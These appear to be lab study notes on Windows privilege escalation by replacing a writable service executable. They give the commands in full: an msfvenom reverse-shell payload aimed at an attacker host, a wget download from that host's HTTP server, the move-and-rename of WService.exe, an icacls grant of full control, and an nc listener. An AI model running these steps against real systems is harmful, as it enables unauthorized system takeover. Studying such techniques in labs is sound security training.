Check the in use services to see if any of them can be abused (e.g WService)

NOTE: must be in cmd.exe

`sc`

check a specific service:

`sc qc <servicename>`

<img src="../../../_resources/Screenshot%202023-05-16%20at%2019.09.17.png" alt="Screenshot 2023-05-16 at 19.09.17.png" width="447" height="240">

use "icacls" to check what permissions you have on the executable:

`icacls C:\PROGRA~2\SYSTEM~1\WService.exe`

<img src="../../../_resources/Screenshot%202023-05-16%20at%2019.10.28.png" alt="Screenshot 2023-05-16 at 19.10.28.png" width="608" height="149">

Above we see that "Everyone" has (M) permissions to modify the executable.

This means that we can generate a payload and name it as the executable (e.g WService.exe)

From here generate a reverse shell to log in as the user that made the service:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`

upload it via the python http server method (`python -m http.server 9000`) and the "wget" command
(`wget http://attacker_ip:9000/whatever_directory/rev-svc.exe -o rev-svc.exe`

then change the name of the original exe file to something else, move & rename the executable to the original one then apply permissions based off the orginal executable permissions:

```cmd
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

set up nc listener as per the created payload (e.g `nc -lvnp 4445`)

now wait untill the task is run (may not be feasible) and you will have shell as the user that made the service